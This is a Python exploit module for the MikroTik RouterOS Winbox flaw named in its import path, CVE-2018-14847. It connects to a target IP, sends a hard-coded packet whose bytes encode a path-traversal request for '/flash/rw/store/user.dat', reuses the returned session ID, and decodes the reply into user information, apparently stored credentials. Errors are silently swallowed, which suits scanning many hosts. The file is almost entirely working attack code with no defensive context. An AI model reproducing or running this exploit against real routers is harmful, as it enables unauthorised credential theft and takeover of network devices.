import socket
from MikroTik.CVE_2018_14847.decode import getresult


def send_socket(ip, port):
    hello = [0x68, 0x01, 0x00, 0x66, 0x4d, 0x32, 0x05, 0x00,
             0xff, 0x01, 0x06, 0x00, 0xff, 0x09, 0x05, 0x07,
             0x00, 0xff, 0x09, 0x07, 0x01, 0x00, 0x00, 0x21,
             0x35, 0x2f, 0x2f, 0x2f, 0x2f, 0x2f, 0x2e, 0x2f,
             0x2e, 0x2e, 0x2f, 0x2f, 0x2f, 0x2f, 0x2f, 0x2f,
             0x2e, 0x2f, 0x2e, 0x2e, 0x2f, 0x2f, 0x2f, 0x2f,
             0x2f, 0x2f, 0x2e, 0x2f, 0x2e, 0x2e, 0x2f, 0x66,
             0x6c, 0x61, 0x73, 0x68, 0x2f, 0x72, 0x77, 0x2f,
             0x73, 0x74, 0x6f, 0x72, 0x65, 0x2f, 0x75, 0x73,
             0x65, 0x72, 0x2e, 0x64, 0x61, 0x74, 0x02, 0x00,
             0xff, 0x88, 0x02, 0x00, 0x00, 0x00, 0x00, 0x00,
             0x08, 0x00, 0x00, 0x00, 0x01, 0x00, 0xff, 0x88,
             0x02, 0x00, 0x02, 0x00, 0x00, 0x00, 0x02, 0x00,
             0x00, 0x00]

    getData = [0x3b, 0x01, 0x00, 0x39, 0x4d, 0x32, 0x05, 0x00,
               0xff, 0x01, 0x06, 0x00, 0xff, 0x09, 0x06, 0x01,
               0x00, 0xfe, 0x09, 0x35, 0x02, 0x00, 0x00, 0x08,
               0x00, 0x80, 0x00, 0x00, 0x07, 0x00, 0xff, 0x09,
               0x04, 0x02, 0x00, 0xff, 0x88, 0x02, 0x00, 0x00,
               0x00, 0x00, 0x00, 0x08, 0x00, 0x00, 0x00, 0x01,
               0x00, 0xff, 0x88, 0x02, 0x00, 0x02, 0x00, 0x00,
               0x00, 0x02, 0x00, 0x00, 0x00]

    try:
        # Socket
        socket_client = socket.socket()
        socket_client.settimeout(1)
        socket_client.connect((ip, port))
        hello = bytearray(hello)
        getData = bytearray(getData)

        # get session id
        socket_client.send(hello)
        result = bytearray(socket_client.recv(1024))
        # copy session id
        getData[19] = result[38]
        # Send Request
        socket_client.send(getData)
        result = bytearray(socket_client.recv(1024))
        # Get results
        # print(ip, ' ', end='')
        user_info = getresult(result[55:])
        result_list = user_info
        return result_list
    except socket.timeout:
        # print(ip, ": Connection Timeout")
        return []
    except ConnectionRefusedError:
        # print(ip, ": Connection Refused")
        return []
    except ConnectionResetError:
        # print(ip, ": Connection Reset")
        return []
    except IndexError:
        # print(ip, ": Index Error")
        return []
    except socket.error:
        # print(ip, ": Socket Error")
        return []


